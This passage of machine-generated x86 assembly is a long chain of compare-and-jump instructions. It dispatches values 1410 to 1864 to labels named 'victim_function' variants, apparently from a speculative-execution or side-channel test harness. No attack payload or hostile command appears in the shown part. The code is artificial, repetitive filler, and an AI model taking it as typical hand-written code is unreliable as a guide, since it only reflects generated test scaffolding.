	cmpl	$1410, %eax
	je	.Lvictim_function_win0_var1410
	cmpl	$1411, %eax
	je	.Lvictim_function_win0_var1411
	cmpl	$1412, %eax
	je	.Lvictim_function_win0_var1412
	cmpl	$1413, %eax
	je	.Lvictim_function_win0_var1413
	cmpl	$1414, %eax
	je	.Lvictim_function_win0_var1414
	cmpl	$1415, %eax
	je	.Lvictim_function_win0_var1415
	cmpl	$1416, %eax
	je	.Lvictim_function_win0_var1416
	cmpl	$1417, %eax
	je	.Lvictim_function_win0_var1417
	cmpl	$1418, %eax
	je	.Lvictim_function_win0_var1418
	cmpl	$1419, %eax
	je	.Lvictim_function_win0_var1419
	cmpl	$1420, %eax
	je	.Lvictim_function_win0_var1420
	cmpl	$1421, %eax
	je	.Lvictim_function_win0_var1421
	cmpl	$1422, %eax
	je	.Lvictim_function_win0_var1422
	cmpl	$1423, %eax
	je	.Lvictim_function_win0_var1423
	cmpl	$1424, %eax
	je	.Lvictim_function_win0_var1424
	cmpl	$1425, %eax
	je	.Lvictim_function_win0_var1425
	cmpl	$1426, %eax
	je	.Lvictim_function_win0_var1426
	cmpl	$1427, %eax
	je	.Lvictim_function_win0_var1427
	cmpl	$1428, %eax
	je	.Lvictim_function_win0_var1428
	cmpl	$1429, %eax
	je	.Lvictim_function_win0_var1429
	cmpl	$1430, %eax
	je	.Lvictim_function_win0_var1430
	cmpl	$1431, %eax
	je	.Lvictim_function_win0_var1431
	cmpl	$1432, %eax
	je	.Lvictim_function_win0_var1432
	cmpl	$1433, %eax
	je	.Lvictim_function_win0_var1433
	cmpl	$1434, %eax
	je	.Lvictim_function_win0_var1434
	cmpl	$1435, %eax
	je	.Lvictim_function_win0_var1435
	cmpl	$1436, %eax
	je	.Lvictim_function_win0_var1436
	cmpl	$1437, %eax
	je	.Lvictim_function_win0_var1437
	cmpl	$1438, %eax
	je	.Lvictim_function_win0_var1438
	cmpl	$1439, %eax
	je	.Lvictim_function_win0_var1439
	cmpl	$1440, %eax
	je	.Lvictim_function_win0_var1440
	cmpl	$1441, %eax
	je	.Lvictim_function_win0_var1441
	cmpl	$1442, %eax
	je	.Lvictim_function_win0_var1442
	cmpl	$1443, %eax
	je	.Lvictim_function_win0_var1443
	cmpl	$1444, %eax
	je	.Lvictim_function_win0_var1444
	cmpl	$1445, %eax
	je	.Lvictim_function_win0_var1445
	cmpl	$1446, %eax
	je	.Lvictim_function_win0_var1446
	cmpl	$1447, %eax
	je	.Lvictim_function_win0_var1447
	cmpl	$1448, %eax
	je	.Lvictim_function_win0_var1448
	cmpl	$1449, %eax
	je	.Lvictim_function_win0_var1449
	cmpl	$1450, %eax
	je	.Lvictim_function_win0_var1450
	cmpl	$1451, %eax
	je	.Lvictim_function_win0_var1451
	cmpl	$1452, %eax
	je	.Lvictim_function_win0_var1452
	cmpl	$1453, %eax
	je	.Lvictim_function_win0_var1453
	cmpl	$1454, %eax
	je	.Lvictim_function_win0_var1454
	cmpl	$1455, %eax
	je	.Lvictim_function_win0_var1455
	cmpl	$1456, %eax
	je	.Lvictim_function_win0_var1456
	cmpl	$1457, %eax
	je	.Lvictim_function_win0_var1457
	cmpl	$1458, %eax
	je	.Lvictim_function_win0_var1458
	cmpl	$1459, %eax
	je	.Lvictim_function_win0_var1459
	cmpl	$1460, %eax
	je	.Lvictim_function_win0_var1460
	cmpl	$1461, %eax
	je	.Lvictim_function_win0_var1461
	cmpl	$1462, %eax
	je	.Lvictim_function_win0_var1462
	cmpl	$1463, %eax
	je	.Lvictim_function_win0_var1463
	cmpl	$1464, %eax
	je	.Lvictim_function_win0_var1464
	cmpl	$1465, %eax
	je	.Lvictim_function_win0_var1465
	cmpl	$1466, %eax
	je	.Lvictim_function_win0_var1466
	cmpl	$1467, %eax
	je	.Lvictim_function_win0_var1467
	cmpl	$1468, %eax
	je	.Lvictim_function_win0_var1468
	cmpl	$1469, %eax
	je	.Lvictim_function_win0_var1469
	cmpl	$1470, %eax
	je	.Lvictim_function_win0_var1470
	cmpl	$1471, %eax
	je	.Lvictim_function_win0_var1471
	cmpl	$1472, %eax
	je	.Lvictim_function_win0_var1472
	cmpl	$1473, %eax
	je	.Lvictim_function_win0_var1473
	cmpl	$1474, %eax
	je	.Lvictim_function_win0_var1474
	cmpl	$1475, %eax
	je	.Lvictim_function_win0_var1475
	cmpl	$1476, %eax
	je	.Lvictim_function_win0_var1476
	cmpl	$1477, %eax
	je	.Lvictim_function_win0_var1477
	cmpl	$1478, %eax
	je	.Lvictim_function_win0_var1478
	cmpl	$1479, %eax
	je	.Lvictim_function_win0_var1479
	cmpl	$1480, %eax
	je	.Lvictim_function_win0_var1480
	cmpl	$1481, %eax
	je	.Lvictim_function_win0_var1481
	cmpl	$1482, %eax
	je	.Lvictim_function_win0_var1482
	cmpl	$1483, %eax
	je	.Lvictim_function_win0_var1483
	cmpl	$1484, %eax
	je	.Lvictim_function_win0_var1484
	cmpl	$1485, %eax
	je	.Lvictim_function_win0_var1485
	cmpl	$1486, %eax
	je	.Lvictim_function_win0_var1486
	cmpl	$1487, %eax
	je	.Lvictim_function_win0_var1487
	cmpl	$1488, %eax
	je	.Lvictim_function_win0_var1488
	cmpl	$1489, %eax
	je	.Lvictim_function_win0_var1489
	cmpl	$1490, %eax
	je	.Lvictim_function_win0_var1490
	cmpl	$1491, %eax
	je	.Lvictim_function_win0_var1491
	cmpl	$1492, %eax
	je	.Lvictim_function_win0_var1492
	cmpl	$1493, %eax
	je	.Lvictim_function_win0_var1493
	cmpl	$1494, %eax
	je	.Lvictim_function_win0_var1494
	cmpl	$1495, %eax
	je	.Lvictim_function_win0_var1495
	cmpl	$1496, %eax
	je	.Lvictim_function_win0_var1496
	cmpl	$1497, %eax
	je	.Lvictim_function_win0_var1497
	cmpl	$1498, %eax
	je	.Lvictim_function_win0_var1498
	cmpl	$1499, %eax
	je	.Lvictim_function_win0_var1499
	cmpl	$1500, %eax
	je	.Lvictim_function_win0_var1500
	cmpl	$1501, %eax
	je	.Lvictim_function_win0_var1501
	cmpl	$1502, %eax
	je	.Lvictim_function_win0_var1502
	cmpl	$1503, %eax
	je	.Lvictim_function_win0_var1503
	cmpl	$1504, %eax
	je	.Lvictim_function_win0_var1504
	cmpl	$1505, %eax
	je	.Lvictim_function_win0_var1505
	cmpl	$1506, %eax
	je	.Lvictim_function_win0_var1506
	cmpl	$1507, %eax
	je	.Lvictim_function_win0_var1507
	cmpl	$1508, %eax
	je	.Lvictim_function_win0_var1508
	cmpl	$1509, %eax
	je	.Lvictim_function_win0_var1509
	cmpl	$1510, %eax
	je	.Lvictim_function_win0_var1510
	cmpl	$1511, %eax
	je	.Lvictim_function_win0_var1511
	cmpl	$1512, %eax
	je	.Lvictim_function_win0_var1512
	cmpl	$1513, %eax
	je	.Lvictim_function_win0_var1513
	cmpl	$1514, %eax
	je	.Lvictim_function_win0_var1514
	cmpl	$1515, %eax
	je	.Lvictim_function_win0_var1515
	cmpl	$1516, %eax
	je	.Lvictim_function_win0_var1516
	cmpl	$1517, %eax
	je	.Lvictim_function_win0_var1517
	cmpl	$1518, %eax
	je	.Lvictim_function_win0_var1518
	cmpl	$1519, %eax
	je	.Lvictim_function_win0_var1519
	cmpl	$1520, %eax
	je	.Lvictim_function_win0_var1520
	cmpl	$1521, %eax
	je	.Lvictim_function_win0_var1521
	cmpl	$1522, %eax
	je	.Lvictim_function_win0_var1522
	cmpl	$1523, %eax
	je	.Lvictim_function_win0_var1523
	cmpl	$1524, %eax
	je	.Lvictim_function_win0_var1524
	cmpl	$1525, %eax
	je	.Lvictim_function_win0_var1525
	cmpl	$1526, %eax
	je	.Lvictim_function_win0_var1526
	cmpl	$1527, %eax
	je	.Lvictim_function_win0_var1527
	cmpl	$1528, %eax
	je	.Lvictim_function_win0_var1528
	cmpl	$1529, %eax
	je	.Lvictim_function_win0_var1529
	cmpl	$1530, %eax
	je	.Lvictim_function_win0_var1530
	cmpl	$1531, %eax
	je	.Lvictim_function_win0_var1531
	cmpl	$1532, %eax
	je	.Lvictim_function_win0_var1532
	cmpl	$1533, %eax
	je	.Lvictim_function_win0_var1533
	cmpl	$1534, %eax
	je	.Lvictim_function_win0_var1534
	cmpl	$1535, %eax
	je	.Lvictim_function_win0_var1535
	cmpl	$1536, %eax
	je	.Lvictim_function_win0_var1536
	cmpl	$1537, %eax
	je	.Lvictim_function_win0_var1537
	cmpl	$1538, %eax
	je	.Lvictim_function_win0_var1538
	cmpl	$1539, %eax
	je	.Lvictim_function_win0_var1539
	cmpl	$1540, %eax
	je	.Lvictim_function_win0_var1540
	cmpl	$1541, %eax
	je	.Lvictim_function_win0_var1541
	cmpl	$1542, %eax
	je	.Lvictim_function_win0_var1542
	cmpl	$1543, %eax
	je	.Lvictim_function_win0_var1543
	cmpl	$1544, %eax
	je	.Lvictim_function_win0_var1544
	cmpl	$1545, %eax
	je	.Lvictim_function_win0_var1545
	cmpl	$1546, %eax
	je	.Lvictim_function_win0_var1546
	cmpl	$1547, %eax
	je	.Lvictim_function_win0_var1547
	cmpl	$1548, %eax
	je	.Lvictim_function_win0_var1548
	cmpl	$1549, %eax
	je	.Lvictim_function_win0_var1549
	cmpl	$1550, %eax
	je	.Lvictim_function_win0_var1550
	cmpl	$1551, %eax
	je	.Lvictim_function_win0_var1551
	cmpl	$1552, %eax
	je	.Lvictim_function_win0_var1552
	cmpl	$1553, %eax
	je	.Lvictim_function_win0_var1553
	cmpl	$1554, %eax
	je	.Lvictim_function_win0_var1554
	cmpl	$1555, %eax
	je	.Lvictim_function_win0_var1555
	cmpl	$1556, %eax
	je	.Lvictim_function_win0_var1556
	cmpl	$1557, %eax
	je	.Lvictim_function_win0_var1557
	cmpl	$1558, %eax
	je	.Lvictim_function_win0_var1558
	cmpl	$1559, %eax
	je	.Lvictim_function_win0_var1559
	cmpl	$1560, %eax
	je	.Lvictim_function_win0_var1560
	cmpl	$1561, %eax
	je	.Lvictim_function_win0_var1561
	cmpl	$1562, %eax
	je	.Lvictim_function_win0_var1562
	cmpl	$1563, %eax
	je	.Lvictim_function_win0_var1563
	cmpl	$1564, %eax
	je	.Lvictim_function_win0_var1564
	cmpl	$1565, %eax
	je	.Lvictim_function_win0_var1565
	cmpl	$1566, %eax
	je	.Lvictim_function_win0_var1566
	cmpl	$1567, %eax
	je	.Lvictim_function_win0_var1567
	cmpl	$1568, %eax
	je	.Lvictim_function_win0_var1568
	cmpl	$1569, %eax
	je	.Lvictim_function_win0_var1569
	cmpl	$1570, %eax
	je	.Lvictim_function_win0_var1570
	cmpl	$1571, %eax
	je	.Lvictim_function_win0_var1571
	cmpl	$1572, %eax
	je	.Lvictim_function_win0_var1572
	cmpl	$1573, %eax
	je	.Lvictim_function_win0_var1573
	cmpl	$1574, %eax
	je	.Lvictim_function_win0_var1574
	cmpl	$1575, %eax
	je	.Lvictim_function_win0_var1575
	cmpl	$1576, %eax
	je	.Lvictim_function_win0_var1576
	cmpl	$1577, %eax
	je	.Lvictim_function_win0_var1577
	cmpl	$1578, %eax
	je	.Lvictim_function_win0_var1578
	cmpl	$1579, %eax
	je	.Lvictim_function_win0_var1579
	cmpl	$1580, %eax
	je	.Lvictim_function_win0_var1580
	cmpl	$1581, %eax
	je	.Lvictim_function_win0_var1581
	cmpl	$1582, %eax
	je	.Lvictim_function_win0_var1582
	cmpl	$1583, %eax
	je	.Lvictim_function_win0_var1583
	cmpl	$1584, %eax
	je	.Lvictim_function_win0_var1584
	cmpl	$1585, %eax
	je	.Lvictim_function_win0_var1585
	cmpl	$1586, %eax
	je	.Lvictim_function_win0_var1586
	cmpl	$1587, %eax
	je	.Lvictim_function_win0_var1587
	cmpl	$1588, %eax
	je	.Lvictim_function_win0_var1588
	cmpl	$1589, %eax
	je	.Lvictim_function_win0_var1589
	cmpl	$1590, %eax
	je	.Lvictim_function_win0_var1590
	cmpl	$1591, %eax
	je	.Lvictim_function_win0_var1591
	cmpl	$1592, %eax
	je	.Lvictim_function_win0_var1592
	cmpl	$1593, %eax
	je	.Lvictim_function_win0_var1593
	cmpl	$1594, %eax
	je	.Lvictim_function_win0_var1594
	cmpl	$1595, %eax
	je	.Lvictim_function_win0_var1595
	cmpl	$1596, %eax
	je	.Lvictim_function_win0_var1596
	cmpl	$1597, %eax
	je	.Lvictim_function_win0_var1597
	cmpl	$1598, %eax
	je	.Lvictim_function_win0_var1598
	cmpl	$1599, %eax
	je	.Lvictim_function_win0_var1599
	cmpl	$1600, %eax
	je	.Lvictim_function_win0_var1600
	cmpl	$1601, %eax
	je	.Lvictim_function_win0_var1601
	cmpl	$1602, %eax
	je	.Lvictim_function_win0_var1602
	cmpl	$1603, %eax
	je	.Lvictim_function_win0_var1603
	cmpl	$1604, %eax
	je	.Lvictim_function_win0_var1604
	cmpl	$1605, %eax
	je	.Lvictim_function_win0_var1605
	cmpl	$1606, %eax
	je	.Lvictim_function_win0_var1606
	cmpl	$1607, %eax
	je	.Lvictim_function_win0_var1607
	cmpl	$1608, %eax
	je	.Lvictim_function_win0_var1608
	cmpl	$1609, %eax
	je	.Lvictim_function_win0_var1609
	cmpl	$1610, %eax
	je	.Lvictim_function_win0_var1610
	cmpl	$1611, %eax
	je	.Lvictim_function_win0_var1611
	cmpl	$1612, %eax
	je	.Lvictim_function_win0_var1612
	cmpl	$1613, %eax
	je	.Lvictim_function_win0_var1613
	cmpl	$1614, %eax
	je	.Lvictim_function_win0_var1614
	cmpl	$1615, %eax
	je	.Lvictim_function_win0_var1615
	cmpl	$1616, %eax
	je	.Lvictim_function_win0_var1616
	cmpl	$1617, %eax
	je	.Lvictim_function_win0_var1617
	cmpl	$1618, %eax
	je	.Lvictim_function_win0_var1618
	cmpl	$1619, %eax
	je	.Lvictim_function_win0_var1619
	cmpl	$1620, %eax
	je	.Lvictim_function_win0_var1620
	cmpl	$1621, %eax
	je	.Lvictim_function_win0_var1621
	cmpl	$1622, %eax
	je	.Lvictim_function_win0_var1622
	cmpl	$1623, %eax
	je	.Lvictim_function_win0_var1623
	cmpl	$1624, %eax
	je	.Lvictim_function_win0_var1624
	cmpl	$1625, %eax
	je	.Lvictim_function_win0_var1625
	cmpl	$1626, %eax
	je	.Lvictim_function_win0_var1626
	cmpl	$1627, %eax
	je	.Lvictim_function_win0_var1627
	cmpl	$1628, %eax
	je	.Lvictim_function_win0_var1628
	cmpl	$1629, %eax
	je	.Lvictim_function_win0_var1629
	cmpl	$1630, %eax
	je	.Lvictim_function_win0_var1630
	cmpl	$1631, %eax
	je	.Lvictim_function_win0_var1631
	cmpl	$1632, %eax
	je	.Lvictim_function_win0_var1632
	cmpl	$1633, %eax
	je	.Lvictim_function_win0_var1633
	cmpl	$1634, %eax
	je	.Lvictim_function_win0_var1634
	cmpl	$1635, %eax
	je	.Lvictim_function_win0_var1635
	cmpl	$1636, %eax
	je	.Lvictim_function_win0_var1636
	cmpl	$1637, %eax
	je	.Lvictim_function_win0_var1637
	cmpl	$1638, %eax
	je	.Lvictim_function_win0_var1638
	cmpl	$1639, %eax
	je	.Lvictim_function_win0_var1639
	cmpl	$1640, %eax
	je	.Lvictim_function_win0_var1640
	cmpl	$1641, %eax
	je	.Lvictim_function_win0_var1641
	cmpl	$1642, %eax
	je	.Lvictim_function_win0_var1642
	cmpl	$1643, %eax
	je	.Lvictim_function_win0_var1643
	cmpl	$1644, %eax
	je	.Lvictim_function_win0_var1644
	cmpl	$1645, %eax
	je	.Lvictim_function_win0_var1645
	cmpl	$1646, %eax
	je	.Lvictim_function_win0_var1646
	cmpl	$1647, %eax
	je	.Lvictim_function_win0_var1647
	cmpl	$1648, %eax
	je	.Lvictim_function_win0_var1648
	cmpl	$1649, %eax
	je	.Lvictim_function_win0_var1649
	cmpl	$1650, %eax
	je	.Lvictim_function_win0_var1650
	cmpl	$1651, %eax
	je	.Lvictim_function_win0_var1651
	cmpl	$1652, %eax
	je	.Lvictim_function_win0_var1652
	cmpl	$1653, %eax
	je	.Lvictim_function_win0_var1653
	cmpl	$1654, %eax
	je	.Lvictim_function_win0_var1654
	cmpl	$1655, %eax
	je	.Lvictim_function_win0_var1655
	cmpl	$1656, %eax
	je	.Lvictim_function_win0_var1656
	cmpl	$1657, %eax
	je	.Lvictim_function_win0_var1657
	cmpl	$1658, %eax
	je	.Lvictim_function_win0_var1658
	cmpl	$1659, %eax
	je	.Lvictim_function_win0_var1659
	cmpl	$1660, %eax
	je	.Lvictim_function_win0_var1660
	cmpl	$1661, %eax
	je	.Lvictim_function_win0_var1661
	cmpl	$1662, %eax
	je	.Lvictim_function_win0_var1662
	cmpl	$1663, %eax
	je	.Lvictim_function_win0_var1663
	cmpl	$1664, %eax
	je	.Lvictim_function_win0_var1664
	cmpl	$1665, %eax
	je	.Lvictim_function_win0_var1665
	cmpl	$1666, %eax
	je	.Lvictim_function_win0_var1666
	cmpl	$1667, %eax
	je	.Lvictim_function_win0_var1667
	cmpl	$1668, %eax
	je	.Lvictim_function_win0_var1668
	cmpl	$1669, %eax
	je	.Lvictim_function_win0_var1669
	cmpl	$1670, %eax
	je	.Lvictim_function_win0_var1670
	cmpl	$1671, %eax
	je	.Lvictim_function_win0_var1671
	cmpl	$1672, %eax
	je	.Lvictim_function_win0_var1672
	cmpl	$1673, %eax
	je	.Lvictim_function_win0_var1673
	cmpl	$1674, %eax
	je	.Lvictim_function_win0_var1674
	cmpl	$1675, %eax
	je	.Lvictim_function_win0_var1675
	cmpl	$1676, %eax
	je	.Lvictim_function_win0_var1676
	cmpl	$1677, %eax
	je	.Lvictim_function_win0_var1677
	cmpl	$1678, %eax
	je	.Lvictim_function_win0_var1678
	cmpl	$1679, %eax
	je	.Lvictim_function_win0_var1679
	cmpl	$1680, %eax
	je	.Lvictim_function_win0_var1680
	cmpl	$1681, %eax
	je	.Lvictim_function_win0_var1681
	cmpl	$1682, %eax
	je	.Lvictim_function_win0_var1682
	cmpl	$1683, %eax
	je	.Lvictim_function_win0_var1683
	cmpl	$1684, %eax
	je	.Lvictim_function_win0_var1684
	cmpl	$1685, %eax
	je	.Lvictim_function_win0_var1685
	cmpl	$1686, %eax
	je	.Lvictim_function_win0_var1686
	cmpl	$1687, %eax
	je	.Lvictim_function_win0_var1687
	cmpl	$1688, %eax
	je	.Lvictim_function_win0_var1688
	cmpl	$1689, %eax
	je	.Lvictim_function_win0_var1689
	cmpl	$1690, %eax
	je	.Lvictim_function_win0_var1690
	cmpl	$1691, %eax
	je	.Lvictim_function_win0_var1691
	cmpl	$1692, %eax
	je	.Lvictim_function_win0_var1692
	cmpl	$1693, %eax
	je	.Lvictim_function_win0_var1693
	cmpl	$1694, %eax
	je	.Lvictim_function_win0_var1694
	cmpl	$1695, %eax
	je	.Lvictim_function_win0_var1695
	cmpl	$1696, %eax
	je	.Lvictim_function_win0_var1696
	cmpl	$1697, %eax
	je	.Lvictim_function_win0_var1697
	cmpl	$1698, %eax
	je	.Lvictim_function_win0_var1698
	cmpl	$1699, %eax
	je	.Lvictim_function_win0_var1699
	cmpl	$1700, %eax
	je	.Lvictim_function_win0_var1700
	cmpl	$1701, %eax
	je	.Lvictim_function_win0_var1701
	cmpl	$1702, %eax
	je	.Lvictim_function_win0_var1702
	cmpl	$1703, %eax
	je	.Lvictim_function_win0_var1703
	cmpl	$1704, %eax
	je	.Lvictim_function_win0_var1704
	cmpl	$1705, %eax
	je	.Lvictim_function_win0_var1705
	cmpl	$1706, %eax
	je	.Lvictim_function_win0_var1706
	cmpl	$1707, %eax
	je	.Lvictim_function_win0_var1707
	cmpl	$1708, %eax
	je	.Lvictim_function_win0_var1708
	cmpl	$1709, %eax
	je	.Lvictim_function_win0_var1709
	cmpl	$1710, %eax
	je	.Lvictim_function_win0_var1710
	cmpl	$1711, %eax
	je	.Lvictim_function_win0_var1711
	cmpl	$1712, %eax
	je	.Lvictim_function_win0_var1712
	cmpl	$1713, %eax
	je	.Lvictim_function_win0_var1713
	cmpl	$1714, %eax
	je	.Lvictim_function_win0_var1714
	cmpl	$1715, %eax
	je	.Lvictim_function_win0_var1715
	cmpl	$1716, %eax
	je	.Lvictim_function_win0_var1716
	cmpl	$1717, %eax
	je	.Lvictim_function_win0_var1717
	cmpl	$1718, %eax
	je	.Lvictim_function_win0_var1718
	cmpl	$1719, %eax
	je	.Lvictim_function_win0_var1719
	cmpl	$1720, %eax
	je	.Lvictim_function_win0_var1720
	cmpl	$1721, %eax
	je	.Lvictim_function_win0_var1721
	cmpl	$1722, %eax
	je	.Lvictim_function_win0_var1722
	cmpl	$1723, %eax
	je	.Lvictim_function_win0_var1723
	cmpl	$1724, %eax
	je	.Lvictim_function_win0_var1724
	cmpl	$1725, %eax
	je	.Lvictim_function_win0_var1725
	cmpl	$1726, %eax
	je	.Lvictim_function_win0_var1726
	cmpl	$1727, %eax
	je	.Lvictim_function_win0_var1727
	cmpl	$1728, %eax
	je	.Lvictim_function_win0_var1728
	cmpl	$1729, %eax
	je	.Lvictim_function_win0_var1729
	cmpl	$1730, %eax
	je	.Lvictim_function_win0_var1730
	cmpl	$1731, %eax
	je	.Lvictim_function_win0_var1731
	cmpl	$1732, %eax
	je	.Lvictim_function_win0_var1732
	cmpl	$1733, %eax
	je	.Lvictim_function_win0_var1733
	cmpl	$1734, %eax
	je	.Lvictim_function_win0_var1734
	cmpl	$1735, %eax
	je	.Lvictim_function_win0_var1735
	cmpl	$1736, %eax
	je	.Lvictim_function_win0_var1736
	cmpl	$1737, %eax
	je	.Lvictim_function_win0_var1737
	cmpl	$1738, %eax
	je	.Lvictim_function_win0_var1738
	cmpl	$1739, %eax
	je	.Lvictim_function_win0_var1739
	cmpl	$1740, %eax
	je	.Lvictim_function_win0_var1740
	cmpl	$1741, %eax
	je	.Lvictim_function_win0_var1741
	cmpl	$1742, %eax
	je	.Lvictim_function_win0_var1742
	cmpl	$1743, %eax
	je	.Lvictim_function_win0_var1743
	cmpl	$1744, %eax
	je	.Lvictim_function_win0_var1744
	cmpl	$1745, %eax
	je	.Lvictim_function_win0_var1745
	cmpl	$1746, %eax
	je	.Lvictim_function_win0_var1746
	cmpl	$1747, %eax
	je	.Lvictim_function_win0_var1747
	cmpl	$1748, %eax
	je	.Lvictim_function_win0_var1748
	cmpl	$1749, %eax
	je	.Lvictim_function_win0_var1749
	cmpl	$1750, %eax
	je	.Lvictim_function_win0_var1750
	cmpl	$1751, %eax
	je	.Lvictim_function_win0_var1751
	cmpl	$1752, %eax
	je	.Lvictim_function_win0_var1752
	cmpl	$1753, %eax
	je	.Lvictim_function_win0_var1753
	cmpl	$1754, %eax
	je	.Lvictim_function_win0_var1754
	cmpl	$1755, %eax
	je	.Lvictim_function_win0_var1755
	cmpl	$1756, %eax
	je	.Lvictim_function_win0_var1756
	cmpl	$1757, %eax
	je	.Lvictim_function_win0_var1757
	cmpl	$1758, %eax
	je	.Lvictim_function_win0_var1758
	cmpl	$1759, %eax
	je	.Lvictim_function_win0_var1759
	cmpl	$1760, %eax
	je	.Lvictim_function_win0_var1760
	cmpl	$1761, %eax
	je	.Lvictim_function_win0_var1761
	cmpl	$1762, %eax
	je	.Lvictim_function_win0_var1762
	cmpl	$1763, %eax
	je	.Lvictim_function_win0_var1763
	cmpl	$1764, %eax
	je	.Lvictim_function_win0_var1764
	cmpl	$1765, %eax
	je	.Lvictim_function_win0_var1765
	cmpl	$1766, %eax
	je	.Lvictim_function_win0_var1766
	cmpl	$1767, %eax
	je	.Lvictim_function_win0_var1767
	cmpl	$1768, %eax
	je	.Lvictim_function_win0_var1768
	cmpl	$1769, %eax
	je	.Lvictim_function_win0_var1769
	cmpl	$1770, %eax
	je	.Lvictim_function_win0_var1770
	cmpl	$1771, %eax
	je	.Lvictim_function_win0_var1771
	cmpl	$1772, %eax
	je	.Lvictim_function_win0_var1772
	cmpl	$1773, %eax
	je	.Lvictim_function_win0_var1773
	cmpl	$1774, %eax
	je	.Lvictim_function_win0_var1774
	cmpl	$1775, %eax
	je	.Lvictim_function_win0_var1775
	cmpl	$1776, %eax
	je	.Lvictim_function_win0_var1776
	cmpl	$1777, %eax
	je	.Lvictim_function_win0_var1777
	cmpl	$1778, %eax
	je	.Lvictim_function_win0_var1778
	cmpl	$1779, %eax
	je	.Lvictim_function_win0_var1779
	cmpl	$1780, %eax
	je	.Lvictim_function_win0_var1780
	cmpl	$1781, %eax
	je	.Lvictim_function_win0_var1781
	cmpl	$1782, %eax
	je	.Lvictim_function_win0_var1782
	cmpl	$1783, %eax
	je	.Lvictim_function_win0_var1783
	cmpl	$1784, %eax
	je	.Lvictim_function_win0_var1784
	cmpl	$1785, %eax
	je	.Lvictim_function_win0_var1785
	cmpl	$1786, %eax
	je	.Lvictim_function_win0_var1786
	cmpl	$1787, %eax
	je	.Lvictim_function_win0_var1787
	cmpl	$1788, %eax
	je	.Lvictim_function_win0_var1788
	cmpl	$1789, %eax
	je	.Lvictim_function_win0_var1789
	cmpl	$1790, %eax
	je	.Lvictim_function_win0_var1790
	cmpl	$1791, %eax
	je	.Lvictim_function_win0_var1791
	cmpl	$1792, %eax
	je	.Lvictim_function_win0_var1792
	cmpl	$1793, %eax
	je	.Lvictim_function_win0_var1793
	cmpl	$1794, %eax
	je	.Lvictim_function_win0_var1794
	cmpl	$1795, %eax
	je	.Lvictim_function_win0_var1795
	cmpl	$1796, %eax
	je	.Lvictim_function_win0_var1796
	cmpl	$1797, %eax
	je	.Lvictim_function_win0_var1797
	cmpl	$1798, %eax
	je	.Lvictim_function_win0_var1798
	cmpl	$1799, %eax
	je	.Lvictim_function_win0_var1799
	cmpl	$1800, %eax
	je	.Lvictim_function_win0_var1800
	cmpl	$1801, %eax
	je	.Lvictim_function_win0_var1801
	cmpl	$1802, %eax
	je	.Lvictim_function_win0_var1802
	cmpl	$1803, %eax
	je	.Lvictim_function_win0_var1803
	cmpl	$1804, %eax
	je	.Lvictim_function_win0_var1804
	cmpl	$1805, %eax
	je	.Lvictim_function_win0_var1805
	cmpl	$1806, %eax
	je	.Lvictim_function_win0_var1806
	cmpl	$1807, %eax
	je	.Lvictim_function_win0_var1807
	cmpl	$1808, %eax
	je	.Lvictim_function_win0_var1808
	cmpl	$1809, %eax
	je	.Lvictim_function_win0_var1809
	cmpl	$1810, %eax
	je	.Lvictim_function_win0_var1810
	cmpl	$1811, %eax
	je	.Lvictim_function_win0_var1811
	cmpl	$1812, %eax
	je	.Lvictim_function_win0_var1812
	cmpl	$1813, %eax
	je	.Lvictim_function_win0_var1813
	cmpl	$1814, %eax
	je	.Lvictim_function_win0_var1814
	cmpl	$1815, %eax
	je	.Lvictim_function_win0_var1815
	cmpl	$1816, %eax
	je	.Lvictim_function_win0_var1816
	cmpl	$1817, %eax
	je	.Lvictim_function_win0_var1817
	cmpl	$1818, %eax
	je	.Lvictim_function_win0_var1818
	cmpl	$1819, %eax
	je	.Lvictim_function_win0_var1819
	cmpl	$1820, %eax
	je	.Lvictim_function_win0_var1820
	cmpl	$1821, %eax
	je	.Lvictim_function_win0_var1821
	cmpl	$1822, %eax
	je	.Lvictim_function_win0_var1822
	cmpl	$1823, %eax
	je	.Lvictim_function_win0_var1823
	cmpl	$1824, %eax
	je	.Lvictim_function_win0_var1824
	cmpl	$1825, %eax
	je	.Lvictim_function_win0_var1825
	cmpl	$1826, %eax
	je	.Lvictim_function_win0_var1826
	cmpl	$1827, %eax
	je	.Lvictim_function_win0_var1827
	cmpl	$1828, %eax
	je	.Lvictim_function_win0_var1828
	cmpl	$1829, %eax
	je	.Lvictim_function_win0_var1829
	cmpl	$1830, %eax
	je	.Lvictim_function_win0_var1830
	cmpl	$1831, %eax
	je	.Lvictim_function_win0_var1831
	cmpl	$1832, %eax
	je	.Lvictim_function_win0_var1832
	cmpl	$1833, %eax
	je	.Lvictim_function_win0_var1833
	cmpl	$1834, %eax
	je	.Lvictim_function_win0_var1834
	cmpl	$1835, %eax
	je	.Lvictim_function_win0_var1835
	cmpl	$1836, %eax
	je	.Lvictim_function_win0_var1836
	cmpl	$1837, %eax
	je	.Lvictim_function_win0_var1837
	cmpl	$1838, %eax
	je	.Lvictim_function_win0_var1838
	cmpl	$1839, %eax
	je	.Lvictim_function_win0_var1839
	cmpl	$1840, %eax
	je	.Lvictim_function_win0_var1840
	cmpl	$1841, %eax
	je	.Lvictim_function_win0_var1841
	cmpl	$1842, %eax
	je	.Lvictim_function_win0_var1842
	cmpl	$1843, %eax
	je	.Lvictim_function_win0_var1843
	cmpl	$1844, %eax
	je	.Lvictim_function_win0_var1844
	cmpl	$1845, %eax
	je	.Lvictim_function_win0_var1845
	cmpl	$1846, %eax
	je	.Lvictim_function_win0_var1846
	cmpl	$1847, %eax
	je	.Lvictim_function_win0_var1847
	cmpl	$1848, %eax
	je	.Lvictim_function_win0_var1848
	cmpl	$1849, %eax
	je	.Lvictim_function_win0_var1849
	cmpl	$1850, %eax
	je	.Lvictim_function_win0_var1850
	cmpl	$1851, %eax
	je	.Lvictim_function_win0_var1851
	cmpl	$1852, %eax
	je	.Lvictim_function_win0_var1852
	cmpl	$1853, %eax
	je	.Lvictim_function_win0_var1853
	cmpl	$1854, %eax
	je	.Lvictim_function_win0_var1854
	cmpl	$1855, %eax
	je	.Lvictim_function_win0_var1855
	cmpl	$1856, %eax
	je	.Lvictim_function_win0_var1856
	cmpl	$1857, %eax
	je	.Lvictim_function_win0_var1857
	cmpl	$1858, %eax
	je	.Lvictim_function_win0_var1858
	cmpl	$1859, %eax
	je	.Lvictim_function_win0_var1859
	cmpl	$1860, %eax
	je	.Lvictim_function_win0_var1860
	cmpl	$1861, %eax
	je	.Lvictim_function_win0_var1861
	cmpl	$1862, %eax
	je	.Lvictim_function_win0_var1862
	cmpl	$1863, %eax
	je	.Lvictim_function_win0_var1863
	cmpl	$1864, %eax
